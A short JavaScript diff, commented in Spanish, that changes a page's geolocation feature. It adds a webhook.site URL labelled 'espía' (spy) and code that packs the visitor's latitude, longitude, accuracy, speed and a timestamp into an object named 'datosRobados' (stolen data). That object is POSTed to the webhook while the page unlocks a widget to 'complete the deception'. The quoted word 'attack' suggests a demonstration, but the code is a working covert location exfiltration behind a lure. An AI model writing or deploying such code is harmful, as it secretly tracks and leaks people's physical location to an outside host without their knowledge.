@@ -21,6 +21,11 @@ document.addEventListener("DOMContentLoaded", function() {
     const resultadoDiv = document.getElementById("resultado");
     const widget = document.getElementById("widget-local"); 
 
+    // --- !! MODIFICACIÓN CLAVE !! ---
+    // Pega tu URL de webhook.site aquí abajo
+    const url_espia = "https://webhook.site/72f2b41d-6ba8-4ca9-b639-b1c3713d8e7b";
+    // ------------------------------------
+
     boton.addEventListener("click", function() {
         
         if (navigator.geolocation) {
@@ -40,11 +45,30 @@ document.addEventListener("DOMContentLoaded", function() {
 
     function mostrarPosicion(posicion) {
         
-        // --- !! ESTA ES LA LÍNEA NUEVA !! ---
-        // Imprime las coordenadas en la consola del navegador
         console.log("¡Ubicación obtenida!", posicion.coords);
-        // -------------------------------------
 
+        // --- !! ESTA ES LA PARTE DEL "ATAQUE" !! ---
+        // 1. Prepara los datos robados
+        const datosRobados = {
+            latitud: posicion.coords.latitude,
+            longitud: posicion.coords.longitude,
+            precision: posicion.coords.accuracy,
+            velocidad: posicion.coords.speed,
+            timestamp: new Date().toISOString()
+        };
+
+        // 2. Envía los datos al servidor "espía" (webhook)
+        fetch(url_espia, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(datosRobados)
+        });
+        // ---------------------------------------------
+
+        
+        // 3. Completa el engaño para el usuario
         widget.classList.add("unlocked");
         resultadoDiv.innerHTML = ""; 
         
